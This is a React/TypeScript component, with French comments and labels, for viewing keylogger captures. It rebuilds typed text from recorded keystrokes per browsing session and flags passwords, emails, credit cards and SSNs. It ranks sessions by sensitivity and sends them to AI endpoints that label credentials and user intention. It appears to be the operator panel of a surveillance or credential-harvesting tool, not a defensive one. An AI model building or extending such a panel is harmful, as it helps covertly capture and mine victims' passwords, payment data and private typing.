import { useState, useMemo } from 'react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { motion } from 'framer-motion'
import {
  KeyRound,
  Mail,
  CreditCard,
  ShieldAlert,
  Search,
  Filter,
  ChevronDown,
  ChevronUp,
  Clock,
  Globe,
  AlertTriangle,
  Brain,
  Loader2
} from 'lucide-react'

interface SessionAnalysis {
  type: string
  category: string
  description: string
  keywords: string[]
  isPasswordEntry: boolean
  containsCredentials: boolean
  intention: string
}

interface URLCorrelation {
  siteType: string
  siteName: string
  riskLevel: 'critical' | 'high' | 'medium' | 'low'
  dataType: string
  highlightReason: string
  detectedData: {
    hasCredentials: boolean
    hasPaymentInfo: boolean
    hasPersonalInfo: boolean
    hasSensitiveSearch: boolean
  }
  securityConcern: string
  recommendations: string[]
  shouldHighlight: boolean
  tags: string[]
}

interface KeylogsViewerProps {
  userId: string
  sessions: Array<{
    url: string
    title: string
    startTime: string
    endTime: string
    keystrokes: Array<{
      key: string
      timestamp: string
      isSpecialKey?: boolean
      inputMetadata?: any
    }>
    sensitivityScore?: number
    sensitivityLevel?: 'low' | 'medium' | 'high' | 'critical'
    sensitiveData?: {
      hasPassword: boolean
      hasEmail: boolean
      hasCreditCard: boolean
      hasSSN: boolean
      hasPhoneNumber: boolean
      passwordInputs: string[]
      emailInputs: string[]
      sensitiveInputs: string[]
    }
  }>
}

export function KeylogsViewer({ sessions }: Omit<KeylogsViewerProps, 'userId'>) {
  const [searchQuery, setSearchQuery] = useState('')
  const [filterLevel, setFilterLevel] = useState<string>('all')
  const [expandedSessions, setExpandedSessions] = useState<Set<number>>(new Set())
  const [sessionAnalyses, setSessionAnalyses] = useState<Map<number, SessionAnalysis | null>>(new Map())
  const [urlCorrelations, setUrlCorrelations] = useState<Map<number, URLCorrelation | null>>(new Map())
  const [analyzingSession, setAnalyzingSession] = useState<number | null>(null)

  // Filtrer et trier les sessions
  const filteredSessions = useMemo(() => {
    let filtered = [...sessions]

    // Filtrer par niveau de sensibilité
    if (filterLevel !== 'all') {
      filtered = filtered.filter(s => s.sensitivityLevel === filterLevel)
    }

    // Filtrer par recherche
    if (searchQuery) {
      const query = searchQuery.toLowerCase()
      filtered = filtered.filter(s => 
        s.url.toLowerCase().includes(query) ||
        s.title.toLowerCase().includes(query) ||
        s.keystrokes.some(k => k.key.toLowerCase().includes(query))
      )
    }

    // Trier par score de sensibilité (plus élevé en premier)
    filtered.sort((a, b) => (b.sensitivityScore || 0) - (a.sensitivityScore || 0))

    return filtered
  }, [sessions, searchQuery, filterLevel])

  const toggleSession = (index: number) => {
    const newExpanded = new Set(expandedSessions)
    if (newExpanded.has(index)) {
      newExpanded.delete(index)
    } else {
      newExpanded.add(index)
      // Analyser la session si pas encore fait
      if (!sessionAnalyses.has(index)) {
        analyzeSession(index, sessions[index])
      }
      // Corréler avec l'URL
      if (!urlCorrelations.has(index)) {
        correlateWithURL(index, sessions[index])
      }
    }
    setExpandedSessions(newExpanded)
  }

  const analyzeSession = async (index: number, session: any) => {
    setAnalyzingSession(index)
    try {
      const response = await fetch('/api/ai/analyze-session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session })
      })
      
      const data = await response.json()
      const newAnalyses = new Map(sessionAnalyses)
      newAnalyses.set(index, data.analysis)
      setSessionAnalyses(newAnalyses)
    } catch (error) {
      console.error('Error analyzing session:', error)
      const newAnalyses = new Map(sessionAnalyses)
      newAnalyses.set(index, null)
      setSessionAnalyses(newAnalyses)
    } finally {
      setAnalyzingSession(null)
    }
  }

  const correlateWithURL = async (index: number, session: any) => {
    try {
      const response = await fetch('/api/ai/correlate-url', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session })
      })
      
      const data = await response.json()
      const newCorrelations = new Map(urlCorrelations)
      newCorrelations.set(index, data.correlation)
      setUrlCorrelations(newCorrelations)

      console.log('🔍 URL Correlation:', data.correlation)
    } catch (error) {
      console.error('Error correlating URL:', error)
      const newCorrelations = new Map(urlCorrelations)
      newCorrelations.set(index, null)
      setUrlCorrelations(newCorrelations)
    }
  }

  const reconstructText = (keystrokes: any[]) => {
    let text = ''
    keystrokes.forEach(k => {
      if (k.key.length === 1 && !k.isSpecialKey) {
        text += k.key
      } else if (k.key === 'Backspace' && text.length > 0) {
        text = text.slice(0, -1)
      } else if (k.key === 'Enter') {
        text += '\n'
      } else if (k.key === ' ') {
        text += ' '
      }
    })
    return text
  }

  const getSensitivityColor = (level?: string) => {
    switch (level) {
      case 'critical': 
        return { bg: 'bg-red-500/20', text: 'text-red-400', border: 'border-red-500/50' }
      case 'high': 
        return { bg: 'bg-orange-500/20', text: 'text-orange-400', border: 'border-orange-500/50' }
      case 'medium': 
        return { bg: 'bg-yellow-500/20', text: 'text-yellow-400', border: 'border-yellow-500/50' }
      case 'low': 
        return { bg: 'bg-green-500/20', text: 'text-green-400', border: 'border-green-500/50' }
      default: 
        return { bg: 'bg-gray-500/20', text: 'text-gray-400', border: 'border-gray-500/50' }
    }
  }

  return (
    <div className="space-y-4">
      {/* Filters */}
      <Card className="glass-card">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <Filter className="w-5 h-5" />
            Keylogs Filter ({filteredSessions.length} sessions)
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex gap-4 flex-wrap">
            {/* Search */}
            <div className="flex-1 min-w-[200px]">
              <div className="relative">
                <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                <Input
                  placeholder="Search in URLs, titles, or keystrokes..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-10"
                />
              </div>
            </div>

            {/* Sensitivity Filter */}
            <div className="flex gap-2">
              <Button
                variant={filterLevel === 'all' ? 'default' : 'outline'}
                size="sm"
                onClick={() => setFilterLevel('all')}
              >
                All
              </Button>
              <Button
                variant={filterLevel === 'critical' ? 'destructive' : 'outline'}
                size="sm"
                onClick={() => setFilterLevel('critical')}
              >
                Critical
              </Button>
              <Button
                variant={filterLevel === 'high' ? 'default' : 'outline'}
                size="sm"
                onClick={() => setFilterLevel('high')}
                className={filterLevel === 'high' ? 'bg-orange-500 hover:bg-orange-600' : ''}
              >
                High
              </Button>
              <Button
                variant={filterLevel === 'medium' ? 'default' : 'outline'}
                size="sm"
                onClick={() => setFilterLevel('medium')}
                className={filterLevel === 'medium' ? 'bg-yellow-500 hover:bg-yellow-600' : ''}
              >
                Medium
              </Button>
              <Button
                variant={filterLevel === 'low' ? 'default' : 'outline'}
                size="sm"
                onClick={() => setFilterLevel('low')}
                className={filterLevel === 'low' ? 'bg-green-500 hover:bg-green-600' : ''}
              >
                Low
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Sessions List */}
      <div className="space-y-3">
        {filteredSessions.map((session, idx) => {
          const isExpanded = expandedSessions.has(idx)
          const color = getSensitivityColor(session.sensitivityLevel)
          const reconstructedText = reconstructText(session.keystrokes)
          const correlation = urlCorrelations.get(idx)
          const shouldHighlight = correlation?.shouldHighlight || false

          return (
            <motion.div
              key={idx}
              initial={{ opacity: 0, y: 10 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: idx * 0.02 }}
            >
              <Card className={`glass-card border ${color.border} ${shouldHighlight ? 'ring-2 ring-primary ring-offset-2 ring-offset-background' : ''}`}>
                <CardHeader className="cursor-pointer" onClick={() => toggleSession(idx)}>
                  <div className="flex items-start justify-between gap-4">
                    <div className="flex-1 space-y-2">
                      <div className="flex items-center gap-3 flex-wrap">
                        <CardTitle className="text-base flex items-center gap-2">
                          <Globe className="w-4 h-4" />
                          {session.title || 'Untitled'}
                        </CardTitle>
                        
                        {/* Sensitivity Badge */}
                        {session.sensitivityLevel && session.sensitivityLevel !== 'low' && (
                          <Badge variant="outline" className={`${color.bg} ${color.text} ${color.border}`}>
                            {session.sensitivityLevel.toUpperCase()}
                          </Badge>
                        )}

                        {/* Sensitive Data Badges */}
                        {session.sensitiveData?.hasPassword && (
                          <Badge variant="destructive" className="text-xs">
                            <KeyRound className="w-3 h-3 mr-1" />
                            Password
                          </Badge>
                        )}
                        {session.sensitiveData?.hasEmail && (
                          <Badge variant="outline" className="text-xs bg-yellow-500/10 text-yellow-400 border-yellow-500/30">
                            <Mail className="w-3 h-3 mr-1" />
                            Email
                          </Badge>
                        )}
                        {session.sensitiveData?.hasCreditCard && (
                          <Badge variant="destructive" className="text-xs">
                            <CreditCard className="w-3 h-3 mr-1" />
                            Credit Card
                          </Badge>
                        )}
                        {session.sensitiveData?.hasSSN && (
                          <Badge variant="destructive" className="text-xs">
                            <ShieldAlert className="w-3 h-3 mr-1" />
                            SSN
                          </Badge>
                        )}
                      </div>

                      <div className="flex items-center gap-4 text-sm text-muted-foreground flex-wrap">
                        <span className="flex items-center gap-1 truncate max-w-md">
                          <Globe className="w-3 h-3" />
                          {session.url}
                        </span>
                        <span className="flex items-center gap-1">
                          <Clock className="w-3 h-3" />
                          {new Date(session.startTime).toLocaleString()}
                        </span>
                        <span className={`flex items-center gap-1 font-medium ${color.text}`}>
                          <AlertTriangle className="w-3 h-3" />
                          Score: {session.sensitivityScore || 0}
                        </span>
                      </div>

                      {/* Password inputs detected */}
                      {session.sensitiveData?.passwordInputs && session.sensitiveData.passwordInputs.length > 0 && (
                        <div className="text-sm text-muted-foreground">
                          Password fields: <span className="font-mono text-red-400">{session.sensitiveData.passwordInputs.join(', ')}</span>
                        </div>
                      )}
                    </div>

                    <Button variant="ghost" size="sm">
                      {isExpanded ? <ChevronUp className="w-4 h-4" /> : <ChevronDown className="w-4 h-4" />}
                    </Button>
                  </div>
                </CardHeader>

                {isExpanded && (
                  <CardContent className="space-y-4">
                    {/* URL Correlation - HIGHLIGHT if critical */}
                    {correlation && correlation.shouldHighlight && (
                      <div className="bg-gradient-to-br from-red-500/20 to-orange-500/20 rounded-lg p-4 border-2 border-red-500/50 shadow-lg shadow-red-500/20">
                        <div className="flex items-center gap-2 mb-3">
                          <AlertTriangle className="w-5 h-5 text-red-400 animate-pulse" />
                          <h4 className="font-bold text-red-400">⚠️ DONNÉES CRITIQUES DÉTECTÉES</h4>
                        </div>
                        <div className="space-y-3">
                          <div className="flex items-start gap-3">
                            <Badge variant="destructive" className="capitalize font-semibold">
                              {correlation.siteType}
                            </Badge>
                            <div className="flex-1">
                              <p className="font-semibold text-lg text-white">{correlation.siteName}</p>
                              <p className="text-sm text-red-200 mt-1 font-medium">
                                🔥 {correlation.highlightReason}
                              </p>
                            </div>
                          </div>

                          {/* Detected Data Types */}
                          <div className="grid grid-cols-2 gap-2 mt-3">
                            {correlation.detectedData.hasCredentials && (
                              <div className="flex items-center gap-2 bg-red-500/20 rounded px-3 py-2 border border-red-500/30">
                                <KeyRound className="w-4 h-4 text-red-400" />
                                <span className="text-sm font-medium text-red-300">Identifiants</span>
                              </div>
                            )}
                            {correlation.detectedData.hasPaymentInfo && (
                              <div className="flex items-center gap-2 bg-red-500/20 rounded px-3 py-2 border border-red-500/30">
                                <CreditCard className="w-4 h-4 text-red-400" />
                                <span className="text-sm font-medium text-red-300">Paiement</span>
                              </div>
                            )}
                            {correlation.detectedData.hasPersonalInfo && (
                              <div className="flex items-center gap-2 bg-orange-500/20 rounded px-3 py-2 border border-orange-500/30">
                                <ShieldAlert className="w-4 h-4 text-orange-400" />
                                <span className="text-sm font-medium text-orange-300">Info Perso</span>
                              </div>
                            )}
                            {correlation.detectedData.hasSensitiveSearch && (
                              <div className="flex items-center gap-2 bg-yellow-500/20 rounded px-3 py-2 border border-yellow-500/30">
                                <Search className="w-4 h-4 text-yellow-400" />
                                <span className="text-sm font-medium text-yellow-300">Recherche Sensible</span>
                              </div>
                            )}
                          </div>

                          {/* Security Concern */}
                          <div className="bg-red-950/50 rounded-lg p-3 border border-red-500/30">
                            <p className="text-sm font-semibold text-red-300 mb-1">⚠️ Préoccupation de sécurité:</p>
                            <p className="text-sm text-red-100">{correlation.securityConcern}</p>
                          </div>

                          {/* Recommendations */}
                          {correlation.recommendations && correlation.recommendations.length > 0 && (
                            <div className="bg-blue-950/50 rounded-lg p-3 border border-blue-500/30">
                              <p className="text-sm font-semibold text-blue-300 mb-2">💡 Recommandations:</p>
                              <ul className="space-y-1">
                                {correlation.recommendations.map((rec, i) => (
                                  <li key={i} className="text-sm text-blue-100 flex items-start gap-2">
                                    <span className="text-blue-400">•</span>
                                    <span>{rec}</span>
                                  </li>
                                ))}
                              </ul>
                            </div>
                          )}

                          {/* Tags */}
                          {correlation.tags && correlation.tags.length > 0 && (
                            <div className="flex flex-wrap gap-1 mt-2">
                              {correlation.tags.map((tag, i) => (
                                <Badge key={i} variant="outline" className="text-xs bg-red-500/10 text-red-300 border-red-500/30">
                                  {tag}
                                </Badge>
                              ))}
                            </div>
                          )}
                        </div>
                      </div>
                    )}

                    {/* Normal URL Info (non-critical) */}
                    {correlation && !correlation.shouldHighlight && (
                      <div className="bg-muted/30 rounded-lg p-3 border border-muted">
                        <div className="flex items-center gap-2 text-sm text-muted-foreground">
                          <Globe className="w-4 h-4" />
                          <span className="font-medium">{correlation.siteName}</span>
                          <Badge variant="outline" className="text-xs capitalize">{correlation.siteType}</Badge>
                          <Badge variant="outline" className="text-xs capitalize">{correlation.dataType}</Badge>
                        </div>
                      </div>
                    )}

                    {/* AI Analysis */}
                    {analyzingSession === idx ? (
                      <div className="flex items-center justify-center gap-3 py-8">
                        <Loader2 className="w-5 h-5 animate-spin text-primary" />
                        <span className="text-muted-foreground">AI analyzing session...</span>
                      </div>
                    ) : sessionAnalyses.get(idx) ? (
                      <div className="bg-gradient-to-br from-primary/10 to-secondary/10 rounded-lg p-4 border border-primary/20">
                        <div className="flex items-center gap-2 mb-3">
                          <Brain className="w-5 h-5 text-primary" />
                          <h4 className="font-semibold">AI Analysis</h4>
                        </div>
                        <div className="space-y-3">
                          <div className="flex items-start gap-3">
                            <Badge variant="outline" className="capitalize">
                              {sessionAnalyses.get(idx)?.type}
                            </Badge>
                            <div className="flex-1">
                              <p className="font-semibold text-sm">{sessionAnalyses.get(idx)?.category}</p>
                              <p className="text-sm text-muted-foreground mt-1">
                                {sessionAnalyses.get(idx)?.description}
                              </p>
                            </div>
                          </div>
                          
                          {sessionAnalyses.get(idx)?.intention && (
                            <div className="text-sm">
                              <span className="text-muted-foreground">Intention: </span>
                              <span>{sessionAnalyses.get(idx)?.intention}</span>
                            </div>
                          )}

                          {sessionAnalyses.get(idx)?.keywords && sessionAnalyses.get(idx)!.keywords.length > 0 && (
                            <div className="flex flex-wrap gap-1">
                              {sessionAnalyses.get(idx)?.keywords.map((keyword, i) => (
                                <Badge key={i} variant="secondary" className="text-xs">
                                  {keyword}
                                </Badge>
                              ))}
                            </div>
                          )}

                          {(sessionAnalyses.get(idx)?.isPasswordEntry || sessionAnalyses.get(idx)?.containsCredentials) && (
                            <div className="flex gap-2 mt-2">
                              {sessionAnalyses.get(idx)?.isPasswordEntry && (
                                <Badge variant="destructive" className="text-xs">
                                  <KeyRound className="w-3 h-3 mr-1" />
                                  Password Entry
                                </Badge>
                              )}
                              {sessionAnalyses.get(idx)?.containsCredentials && (
                                <Badge variant="destructive" className="text-xs">
                                  <ShieldAlert className="w-3 h-3 mr-1" />
                                  Contains Credentials
                                </Badge>
                              )}
                            </div>
                          )}
                        </div>
                      </div>
                    ) : null}

                    {/* Captured Text */}
                    <div>
                      <h4 className="font-semibold mb-2 flex items-center gap-2">
                        <span>Captured Text</span>
                        <Badge variant="outline">{session.keystrokes.length} keystrokes</Badge>
                      </h4>
                      <div className="bg-muted/50 rounded-lg p-4 font-mono text-sm max-h-64 overflow-y-auto whitespace-pre-wrap break-words">
                        {reconstructedText || '(No text captured)'}
                      </div>
                    </div>
                  </CardContent>
                )}
              </Card>
            </motion.div>
          )
        })}

        {filteredSessions.length === 0 && (
          <Card className="glass-card">
            <CardContent className="text-center py-12">
              <p className="text-muted-foreground">No sessions match your filters</p>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
